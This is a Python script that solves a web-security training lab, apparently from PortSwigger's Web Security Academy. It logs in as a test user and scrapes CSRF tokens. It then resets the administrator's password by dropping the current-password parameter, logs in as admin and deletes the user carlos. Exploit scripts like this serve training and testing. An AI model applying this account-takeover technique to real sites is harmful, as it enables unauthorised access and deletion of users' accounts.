##############################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 27/10/2023
#
# Lab: Weak isolation on dual-use endpoint
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie to login
#        3. Login as wiener
#        4. Fetch wiener's profle
#        5. Extract the csrf token needed for changing password
#        6. Change the administrato's password by removing the current-password parameter 
#           from the request to skip the validation
#        7. Fetch the login page
#        8. Extract the csrf token and session cookie to login
#        9. Login as administrator
#        10. Delete carlos from the admin panel
#
##############################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a55001304cfdb95812fd9710008005e.web-security-academy.net"

try:  
    # fetch the login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener's profile
    wiener = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener's profile.. " + Fore.GREEN + "OK")

# extract the csrf token needed for changing password
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

print(Fore.WHITE + "⦗5⦘ Extracting the csrf token needed for changing password.. " + Fore.GREEN + "OK")

# the new password to set for the administrator
# you can change this to what you want
new_password = "hacked"

# data to send via POST
data = {
    "username": "administrator",
    "new-password-1": new_password,
    "new-password-2": new_password,
    "csrf": csrf,
}

try:  
    # change the administrator's password
    requests.post(f"{url}/my-account/change-password", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to change the administrator's password through exception")
    exit(1)

print(Fore.WHITE + "⦗6⦘ Changing the administrator's password to " + Fore.YELLOW + new_password + Fore.WHITE + ".. " + Fore.GREEN + "OK")

try:  
    # fetch the login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗7⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗8⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "administrator",
    "password": new_password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as administrator
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as administrator through exception")
    exit(1)

print(Fore.WHITE + "⦗9⦘ Logging in as administrator.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # delete carlos
    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "⦗10⦘ Deleting carlos.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


